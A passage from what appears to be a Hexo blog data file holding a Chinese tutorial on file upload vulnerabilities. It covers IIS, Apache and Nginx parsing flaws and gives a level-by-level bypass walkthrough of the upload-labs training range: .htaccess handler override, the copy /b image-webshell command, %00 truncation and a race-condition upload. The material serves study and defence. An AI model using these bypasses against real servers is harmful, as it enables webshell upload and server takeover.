(Pass-13)**\n\n***过滤代码：***\n\n![](文件上传漏洞\\QQ截图20190306104525.png)\n\n***绕过方式：***\n\n使用图片马即可，图片马制作见Pass-04。\n\n**12.文件内容过滤之文件类型 (Pass-14、Pass-15)**\n\n***过滤代码：***\n\n`getimagesize (string  $filename)`返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF...\n\n`exif_imagetype()`读取一个图像的第一个字节并检查其签名。\n\n![](文件上传漏洞\\QQ截图20190306105122.png)\n\n![](文件上传漏洞\\QQ截图20190306105746.png)\n\n***绕过方式：***\n\n使用图片马进行绕过。\n\n**13.文件内容过滤之二次渲染 (Pass-16)**\n\n***过滤代码：***\n\n`imagecreatefromjpeg`二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。\n\n![](文件上传漏洞\\QQ截图20190306112443.png)\n\n***绕过方式：***\n\n绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。\n\n二次渲染与绕过方法参考连接：`https://secgeek.net/bookfresh-vulnerability/`\n\n**14.条件竞争 （Pass-17）**\n\n***过滤代码：***`unlink()`函数作用是删除文件。若成功，则返回 true，失败则返回 false。\n\n![](文件上传漏洞\\QQ截图20190306114556.png)\n\n***绕过方式：***\n\n这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。\n\n因此，绕过的思路就是在文件被安全检查删除之前访问文件。\n\n多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。\n\n攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到`intruder`模块，清空变量，然后选择Payload的类型为`Null payloads`，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。\n\n![](文件上传漏洞\\QQ截图20190306130645.png)\n\n![](文件上传漏洞\\QQ截图20190306131219.png)\n\n![](文件上传漏洞\\QQ截图20190306131709.png)\n\n**参考连接：**\n\nhttps://xz.aliyun.com/t/2435\n\nhttps://github.com/LandGrey/upload-labs-writeup\n\nhttp://www.cnblogs.com/shellr00t/p/6426856.html\n\nhttps://www.anquanke.com/post/id/164561","slug":"文件上传漏洞","published":1,"updated":"2019-03-06T07:05:41.036Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjgae001yj8r0rlnnb3c1","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><blockquote>\n<p>文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。</p>\n</blockquote>\n<h3 id=\"0x00-漏洞常见危害\"><a href=\"#0x00-漏洞常见危害\" class=\"headerlink\" title=\"0x00 漏洞常见危害\"></a>0x00 漏洞常见危害</h3><ol>\n<li>上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。</li>\n<li>上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。</li>\n<li>上传病毒、木马文件，并诱骗管理员或用户下载执行。</li>\n<li>上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。</li>\n</ol>\n<a id=\"more\"></a>\n<h3 id=\"0x01-攻击条件\"><a href=\"#0x01-攻击条件\" class=\"headerlink\" title=\"0x01 攻击条件\"></a>0x01 攻击条件</h3><ol>\n<li>上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）</li>\n<li>上传的文件能被WEB容器解释执行。</li>\n<li>文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。</li>\n</ol>\n<h3 id=\"0x02-安全的上传功能\"><a href=\"#0x02-安全的上传功能\" class=\"headerlink\" title=\"0x02 安全的上传功能\"></a>0x02 安全的上传功能</h3><ol>\n<li>上传目录设置为不可执行。</li>\n<li>判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。</li>\n<li>使用随机数重命名上传的文件及改写路径。</li>\n<li>文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）</li>\n</ol>\n<h3 id=\"0x03-文件上传功能\"><a href=\"#0x03-文件上传功能\" class=\"headerlink\" title=\"0x03 文件上传功能\"></a>0x03 文件上传功能</h3><blockquote>\n<p>文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305132724.png\" alt></p>\n<h2 id=\"二、文件解析漏洞\"><a href=\"#二、文件解析漏洞\" class=\"headerlink\" title=\"二、文件解析漏洞\"></a>二、文件解析漏洞</h2><blockquote>\n<p>解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。</p>\n</blockquote>\n<h3 id=\"0x00-IIS解析漏洞\"><a href=\"#0x00-IIS解析漏洞\" class=\"headerlink\" title=\"0x00 IIS解析漏洞\"></a>0x00 IIS解析漏洞</h3><p><strong>IIS 6.0解析漏洞</strong></p>\n<p>1.文件名截断，截断字符为分号（;）：</p>\n<ul>\n<li>例如文件名：<code>xx.asp;yy.jpg</code>，会被作为<code>xx.asp</code>。</li>\n</ul>\n<p>2.文件夹扩展名解析漏洞，<code>/*.asp/</code>目录下的所有文件都会被作为asp文件解析。</p>\n<ul>\n<li>例如：<code>/x.asp/y.jpg</code>，<code>y.jpg</code>会被作为asp文件解析。</li>\n</ul>\n<p>3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; test.asa</span><br><span class=\"line\">&gt; test.cer</span><br><span class=\"line\">&gt; test.cdx</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>IIS PUT漏洞</strong></p>\n<p><code>PUT</code>是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。</p>\n<p>在IIS中，若目录具有<code>写权限</code>且<code>Webdav</code>是开启的，就会支持PUT方法。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954468_5c162264b3e77.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954489_5c16227975735.png\" alt></p>\n<h3 id=\"0x01-Apache解析漏洞\"><a href=\"#0x01-Apache解析漏洞\" class=\"headerlink\" title=\"0x01 Apache解析漏洞\"></a>0x01 Apache解析漏洞</h3><p><strong>Apache 1.x、2.x：</strong></p>\n<ul>\n<li>Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。</li>\n<li>Apache可识别的文件后缀（类型）定义在<code>mime.types</code>文件中。</li>\n</ul>\n<blockquote>\n<p>例如文件名：<code>shell.php.rar.rar.rar</code>，Apache由于无法识别<code>.rar</code>，会从后往前一直寻找可识别的文件类型，最后会将其作为<code>.php</code>文件。</p>\n</blockquote>\n<h3 id=\"0x02-Nginx解析漏洞\"><a href=\"#0x02-Nginx解析漏洞\" class=\"headerlink\" title=\"0x02 Nginx解析漏洞\"></a>0x02 Nginx解析漏洞</h3><p><strong>1.漏洞外在表现：</strong></p>\n<ul>\n<li>访问：<code>http://xx.com/x.jpg/y.php</code>，<code>x.jpg</code>会被作为php文件执行。注意<code>y.php</code>是实际不存在的。</li>\n</ul>\n<p><strong>2.漏洞原理：</strong></p>\n<ul>\n<li>严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。</li>\n<li>在nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code>。当访问<code>http://xx.com/shell.jpg/test.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>shell.jpg/test.php</code>，然后将构造好的<code>SCRIPT_FILENAME</code>传递给cgi Server。</li>\n<li>当php开启<code>cgi.fix_pathinfo</code>这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：<ul>\n<li>PHP会认为<code>SCRIPT_FILENAME</code>是<code>shell.jpg</code>，而<code>test.php</code>是<code>PATH_INFO</code>，所以就会将<code>shell.jpg</code>作为PHP文件来解析了。</li>\n</ul>\n</li>\n<li>因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。</li>\n</ul>\n<p><strong>3.漏洞修复：</strong></p>\n<ul>\n<li>修改<code>php.ini</code>文件，将<code>cgi.fix_pathinfo</code>的值设置为0;</li>\n</ul>\n<h2 id=\"三、文件上传过滤与绕过\"><a href=\"#三、文件上传过滤与绕过\" class=\"headerlink\" title=\"三、文件上传过滤与绕过\"></a>三、文件上传过滤与绕过</h2><p><img src=\"/2019/03/05/文件上传漏洞/20180712092548-81b98800-85-1.png\" alt></p>\n<p>结合<code>upload-labs</code>文件上传漏洞靶场进行分析学习。</p>\n<p>靶场地址：<code>https://github.com/c0ny1/upload-labs</code></p>\n<h3 id=\"0x00-前端过滤与绕过（Pass-01）\"><a href=\"#0x00-前端过滤与绕过（Pass-01）\" class=\"headerlink\" title=\"0x00 前端过滤与绕过（Pass-01）\"></a>0x00 前端过滤与绕过（Pass-01）</h3><p><strong><em>过滤:</em></strong></p>\n<p>前端使用JS对上传的文件后缀进行限制。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305144900.png\" alt></p>\n<p><strong><em>绕过:</em></strong></p>\n<p>禁用浏览器Javascript。</p>\n<p>或者使用Burpsuite抓包修改文件名的方式。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305145812.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150014.png\" alt></p>\n<h3 id=\"0x01-后端过滤与绕过\"><a href=\"#0x01-后端过滤与绕过\" class=\"headerlink\" title=\"0x01 后端过滤与绕过\"></a>0x01 后端过滤与绕过</h3><p><strong>1.Mime类型过滤：Content-Type （Pass-02）</strong></p>\n<p><strong><em>过滤代码：</em></strong>只允许上传特定mime类型的文件。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150607.png\" alt></p>\n<p><strong><em>Mime类型过滤绕过：</em></strong></p>\n<p>抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151049.png\" alt></p>\n<p><strong>2.黑名单过滤之过滤不全 (Pass-03)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151732.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：<code>.php3</code>、<code>.php4</code>、<code>.phtml</code>等后缀。</p>\n<p><strong>3.黑名单过滤之未过滤.htaccess （Pass-04）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305161438.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>可以发现大部分文件后缀被过滤，但<code>.htaccess</code>未被过滤时，可以上传一个<code>.htaccess</code>文件，文件内容：</p>\n<blockquote>\n<p><code>SetHandler application/x-httpd-php</code></p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305154725.png\" alt></p>\n<p>上传这样的<code>.htaccess</code>文件后，所有文件都会被解析为php，然后再上传图片马，图片会被解析为php文件执行，就可以绕过过滤实现攻击。</p>\n<p>DOS下图片马制作：</p>\n<blockquote>\n<p><strong><code>copy /b a.png + /a b.php  c.png</code></strong></p>\n<blockquote>\n<ul>\n<li><code>/b</code>表示a.png是二进制文件，以二进制方式合并文件。</li>\n<li><code>/a</code>表示b.php是ASCII文件。（该参数可以省略）</li>\n<li><code>c.png</code>是合并后得到的文件。</li>\n</ul>\n</blockquote>\n</blockquote>\n<p>上传图片马并访问：</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305160625.png\" alt></p>\n<blockquote>\n<p>PS:<code>.htacess</code>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。<code>.htaccess</code>文件(或者”分布式配置文件”），提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p>\n</blockquote>\n<p><strong>4.黑名单过滤之未统一大小写 （Pass-05）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>strtolower()</code>字符串函数会将字符串的所有字符变为小写。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163146.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>由于未统一大小写，导致过滤不全，可尝试<code>.PhP</code>、<code>.pHP</code>等后缀的方式绕过。</p>\n<p><strong>5.黑名单过滤之未去除空白 （Pass-06）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>trim()</code>字符串函数会将字符串首尾的空白去除。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305163603.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>在文件后缀前或者后面加入空白。</p>\n<p><strong>6.黑名单过滤之未去除”.” （Pass-07）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305164357.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>利用windows特性，会自动去掉后缀名中最后的<code>.</code>，可在后缀名中加<code>.</code>绕过。</p>\n<p>抓包修改文件名，在文件名最后加入<code>.</code>。</p>\n<p><strong>6.黑名单过滤之未去除”::$DATA” （Pass-08）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305165249.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong><br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。目的就是不检查后缀名。</p>\n<p>即在文件名之后加<code>::$DATA</code>绕过。</p>\n<p><strong>7.黑名单过滤之文件名拼接 （Pass-09）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306092934.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>抓包修改文件名为：<code>xxxx.php. .</code>(点 空格 点)</p>\n<p><strong>8.黑名单过滤之替换后缀名 (Pass-10)</strong></p>\n<p>过滤代码：<code>str_ireplace(find,replace,string,count)</code>函数替换字符串中的一些字符（不区分大小写）。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306093435.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用双写后缀的方式绕过，如使用<code>shell.pphphp</code>，中间的<code>php</code>字符被替换为空后，得到<code>shell.php</code>。</p>\n<p><strong>9.白名单过滤之路径拼接GET (Pass-11)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306094436.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用<code>%00</code>截断，<code>%00</code>是URL编码后的空字符，即ASCII码为0的字符（空字符），十六进制表示为<code>0x00</code>，转义字符为<code>\\0</code>，在C、PHP等语言中空字符表示字符串的结束。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图201903061003321.png\" alt></p>\n<blockquote>\n<ul>\n<li>截断条件：<ul>\n<li>php版本小于5.3.4 详情关注CVE-2006-7243</li>\n<li>php的<code>magic_quotes_gpc</code>为OFF状态   //如果不修改将无法上传成功，默认为ON</li>\n</ul>\n</li>\n<li><code>%00</code>截断参考链接：<code>https://www.2cto.com/article/201502/377462.html</code></li>\n</ul>\n</blockquote>\n<p><strong>10.白名单过滤之路径拼接POST （Pass-12）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306102231.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>同样使用<code>%00</code>截断绕过，但是与GET方式不同的是，由于GET提交的数据是在URL中的，因此服务器会对其进行URL decode。而POST提交的是不会进行URL解码的，因此需要在十六进进制中添加<code>0x00</code>。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103406.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306103855.png\" alt></p>\n<p><strong>11.文件内容过滤之内容匹配 (Pass-13)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306104525.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马即可，图片马制作见Pass-04。</p>\n<p><strong>12.文件内容过滤之文件类型 (Pass-14、Pass-15)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>getimagesize (string  $filename)</code>返回一个具有四个单元的数组。索引0包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF…</p>\n<p><code>exif_imagetype()</code>读取一个图像的第一个字节并检查其签名。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105122.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306105746.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>使用图片马进行绕过。</p>\n<p><strong>13.文件内容过滤之二次渲染 (Pass-16)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><code>imagecreatefromjpeg</code>二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306112443.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>绕过方法是将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写脚本程序。</p>\n<p>二次渲染与绕过方法参考连接：<code>https://secgeek.net/bookfresh-vulnerability/</code></p>\n<p><strong>14.条件竞争 （Pass-17）</strong></p>\n<p><strong><em>过滤代码：</em></strong><code>unlink()</code>函数作用是删除文件。若成功，则返回 true，失败则返回 false。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306114556.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>这里注意一个点，不管什么文件都是会被上传到服务器上的，上传到服务器之后才进行白名单检查。</p>\n<p>因此，绕过的思路就是在文件被安全检查删除之前访问文件。</p>\n<p>多个进程并发访问和操作同一数据且执行结果与访问的特定顺序有关，称为竞争条件。</p>\n<p>攻击方法：上传一个php文件，使用Burpsuite进行抓包并将数据包发送到<code>intruder</code>模块，清空变量，然后选择Payload的类型为<code>Null payloads</code>，并输入重放数据包的数量，保证不断在上传文件。同时使用浏览器不断刷新访问上传的php文件，直到访问成功。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306130645.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306131219.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190306131709.png\" alt></p>\n<p><strong>参考连接：</strong></p>\n<p><a href=\"https://xz.aliyun.com/t/2435\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2435</a></p>\n<p><a href=\"https://github.com/LandGrey/upload-labs-writeup\" target=\"_blank\" rel=\"noopener\">https://github.com/LandGrey/upload-labs-writeup</a></p>\n<p><a href=\"http://www.cnblogs.com/shellr00t/p/6426856.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/shellr00t/p/6426856.html</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/164561\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/164561</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><blockquote>\n<p>文件上传漏洞是指用户上传可执行的脚本文件，并通过此脚本获得了执行服务器命令的能力。</p>\n</blockquote>\n<h3 id=\"0x00-漏洞常见危害\"><a href=\"#0x00-漏洞常见危害\" class=\"headerlink\" title=\"0x00 漏洞常见危害\"></a>0x00 漏洞常见危害</h3><ol>\n<li>上传web脚本语言文件，WEB容器解释运行了上传的脚本文件，导致代码执行。</li>\n<li>上传Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域的行为。</li>\n<li>上传病毒、木马文件，并诱骗管理员或用户下载执行。</li>\n<li>上传合法文件，但内容为脚本语言代码，配合文件包含漏洞执行脚本。</li>\n</ol>","more":"<h3 id=\"0x01-攻击条件\"><a href=\"#0x01-攻击条件\" class=\"headerlink\" title=\"0x01 攻击条件\"></a>0x01 攻击条件</h3><ol>\n<li>上传文件后，要能通过WEB访问该文件。（能知道文件的路径并能访问）</li>\n<li>上传的文件能被WEB容器解释执行。</li>\n<li>文件被安全检查、改变内容，如压缩等操作，也会导致攻击不成功。</li>\n</ol>\n<h3 id=\"0x02-安全的上传功能\"><a href=\"#0x02-安全的上传功能\" class=\"headerlink\" title=\"0x02 安全的上传功能\"></a>0x02 安全的上传功能</h3><ol>\n<li>上传目录设置为不可执行。</li>\n<li>判断文件类型，对危险的文件类型进行过滤，且应采用白名单而不是黑名单方式过滤。</li>\n<li>使用随机数重命名上传的文件及改写路径。</li>\n<li>文件服务器使用单独的域名，这样有一些攻击会受到同源策略的影响而导致不生效。（如上传的是crossdomain.xml、XSS利用的Javascript文件等）</li>\n</ol>\n<h3 id=\"0x03-文件上传功能\"><a href=\"#0x03-文件上传功能\" class=\"headerlink\" title=\"0x03 文件上传功能\"></a>0x03 文件上传功能</h3><blockquote>\n<p>文件上传本质上是客户端的 POST 请求，前端上传页面表单处需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305132724.png\" alt></p>\n<h2 id=\"二、文件解析漏洞\"><a href=\"#二、文件解析漏洞\" class=\"headerlink\" title=\"二、文件解析漏洞\"></a>二、文件解析漏洞</h2><blockquote>\n<p>解析漏洞是指不同Web容器对文件的解析方式的特性，一些解析特性配合文件上传功能会造成巨大的安全问题。</p>\n</blockquote>\n<h3 id=\"0x00-IIS解析漏洞\"><a href=\"#0x00-IIS解析漏洞\" class=\"headerlink\" title=\"0x00 IIS解析漏洞\"></a>0x00 IIS解析漏洞</h3><p><strong>IIS 6.0解析漏洞</strong></p>\n<p>1.文件名截断，截断字符为分号（;）：</p>\n<ul>\n<li>例如文件名：<code>xx.asp;yy.jpg</code>，会被作为<code>xx.asp</code>。</li>\n</ul>\n<p>2.文件夹扩展名解析漏洞，<code>/*.asp/</code>目录下的所有文件都会被作为asp文件解析。</p>\n<ul>\n<li>例如：<code>/x.asp/y.jpg</code>，<code>y.jpg</code>会被作为asp文件解析。</li>\n</ul>\n<p>3.IIS 6.0除了可以解析执行asp类型文件外，还有三种可执行文件类型：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; test.asa</span><br><span class=\"line\">&gt; test.cer</span><br><span class=\"line\">&gt; test.cdx</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>IIS PUT漏洞</strong></p>\n<p><code>PUT</code>是在Webdav中定义的一个方法，该方法允许用户上传文件到指定路径下。</p>\n<p>在IIS中，若目录具有<code>写权限</code>且<code>Webdav</code>是开启的，就会支持PUT方法。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954468_5c162264b3e77.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/1544954489_5c16227975735.png\" alt></p>\n<h3 id=\"0x01-Apache解析漏洞\"><a href=\"#0x01-Apache解析漏洞\" class=\"headerlink\" title=\"0x01 Apache解析漏洞\"></a>0x01 Apache解析漏洞</h3><p><strong>Apache 1.x、2.x：</strong></p>\n<ul>\n<li>Apache对文件名的解析是从后往前的，直到遇到可识别的文件后缀为止。</li>\n<li>Apache可识别的文件后缀（类型）定义在<code>mime.types</code>文件中。</li>\n</ul>\n<blockquote>\n<p>例如文件名：<code>shell.php.rar.rar.rar</code>，Apache由于无法识别<code>.rar</code>，会从后往前一直寻找可识别的文件类型，最后会将其作为<code>.php</code>文件。</p>\n</blockquote>\n<h3 id=\"0x02-Nginx解析漏洞\"><a href=\"#0x02-Nginx解析漏洞\" class=\"headerlink\" title=\"0x02 Nginx解析漏洞\"></a>0x02 Nginx解析漏洞</h3><p><strong>1.漏洞外在表现：</strong></p>\n<ul>\n<li>访问：<code>http://xx.com/x.jpg/y.php</code>，<code>x.jpg</code>会被作为php文件执行。注意<code>y.php</code>是实际不存在的。</li>\n</ul>\n<p><strong>2.漏洞原理：</strong></p>\n<ul>\n<li>严格来说这并不是Nginx的漏洞，Nginx通常是以fastcgi的方式支持PHP解析的，nginx作为代理把HTTP请求转发给fastcgi Server。</li>\n<li>在nginx配置文件中通过正则匹配设置<code>SCRIPT_FILENAME</code>。当访问<code>http://xx.com/shell.jpg/test.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>shell.jpg/test.php</code>，然后将构造好的<code>SCRIPT_FILENAME</code>传递给cgi Server。</li>\n<li>当php开启<code>cgi.fix_pathinfo</code>这个选项时（默认开启），那么就会触发在PHP中的如下逻辑：<ul>\n<li>PHP会认为<code>SCRIPT_FILENAME</code>是<code>shell.jpg</code>，而<code>test.php</code>是<code>PATH_INFO</code>，所以就会将<code>shell.jpg</code>作为PHP文件来解析了。</li>\n</ul>\n</li>\n<li>因此这实际不是nginx的漏洞，在使用fastcgi的其他环境下，PHP也存在相同问题，IIS7.0/7.5就是这样的。</li>\n</ul>\n<p><strong>3.漏洞修复：</strong></p>\n<ul>\n<li>修改<code>php.ini</code>文件，将<code>cgi.fix_pathinfo</code>的值设置为0;</li>\n</ul>\n<h2 id=\"三、文件上传过滤与绕过\"><a href=\"#三、文件上传过滤与绕过\" class=\"headerlink\" title=\"三、文件上传过滤与绕过\"></a>三、文件上传过滤与绕过</h2><p><img src=\"/2019/03/05/文件上传漏洞/20180712092548-81b98800-85-1.png\" alt></p>\n<p>结合<code>upload-labs</code>文件上传漏洞靶场进行分析学习。</p>\n<p>靶场地址：<code>https://github.com/c0ny1/upload-labs</code></p>\n<h3 id=\"0x00-前端过滤与绕过（Pass-01）\"><a href=\"#0x00-前端过滤与绕过（Pass-01）\" class=\"headerlink\" title=\"0x00 前端过滤与绕过（Pass-01）\"></a>0x00 前端过滤与绕过（Pass-01）</h3><p><strong><em>过滤:</em></strong></p>\n<p>前端使用JS对上传的文件后缀进行限制。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305144900.png\" alt></p>\n<p><strong><em>绕过:</em></strong></p>\n<p>禁用浏览器Javascript。</p>\n<p>或者使用Burpsuite抓包修改文件名的方式。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305145812.png\" alt></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150014.png\" alt></p>\n<h3 id=\"0x01-后端过滤与绕过\"><a href=\"#0x01-后端过滤与绕过\" class=\"headerlink\" title=\"0x01 后端过滤与绕过\"></a>0x01 后端过滤与绕过</h3><p><strong>1.Mime类型过滤：Content-Type （Pass-02）</strong></p>\n<p><strong><em>过滤代码：</em></strong>只允许上传特定mime类型的文件。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305150607.png\" alt></p>\n<p><strong><em>Mime类型过滤绕过：</em></strong></p>\n<p>抓包修改Content-Type为允许的类型即可。实际情况中不知允许mime的类型，可以使用Burp进行枚举。</p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151049.png\" alt></p>\n<p><strong>2.黑名单过滤之过滤不全 (Pass-03)</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305151732.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>被过滤的后缀很少时可以尝试使用其他未加入黑名单且可以被解析的文件后缀。如：<code>.php3</code>、<code>.php4</code>、<code>.phtml</code>等后缀。</p>\n<p><strong>3.黑名单过滤之未过滤.htaccess （Pass-04）</strong></p>\n<p><strong><em>过滤代码：</em></strong></p>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305161438.png\" alt></p>\n<p><strong><em>绕过方式：</em></strong></p>\n<p>可以发现大部分文件后缀被过滤，但<code>.htaccess</code>未被过滤时，可以上传一个<code>.htaccess</code>文件，文件内容：</p>\n<blockquote>\n<p><code>SetHandler application/x-httpd-php</code></p>\n</blockquote>\n<p><img src=\"/2019/03/05/文件上传漏洞/QQ截图20190305154725.png\" 